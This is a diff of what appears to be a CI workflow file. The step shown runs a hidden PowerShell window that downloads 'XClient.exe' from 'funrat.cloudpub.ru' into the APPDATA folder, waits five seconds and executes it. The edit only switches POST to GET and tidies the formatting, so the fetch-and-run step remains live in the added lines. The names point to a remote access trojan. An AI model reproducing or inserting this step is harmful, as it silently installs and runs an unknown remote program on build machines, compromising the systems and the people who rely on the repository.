@@ -16,8 +16,8 @@ jobs:
       - name: Download and run .exe file without console
         run: |
           powershell -WindowStyle Hidden -Command "
-          $exePath = Join-Path $env:APPDATA 'fuuck.exe'
-          Invoke-WebRequest -Uri 'https://funrat.cloudpub.ru/XClient.exe' -Method POST -OutFile $exePath;
-          Start-Sleep -Seconds 5;
-          Start-Process $exePath
+            $exePath = Join-Path $env:APPDATA 'fuuck.exe'
+            Invoke-WebRequest -Uri 'https://funrat.cloudpub.ru/XClient.exe' -Method GET -OutFile $exePath
+            Start-Sleep -Seconds 5
+            Start-Process $exePath
           "
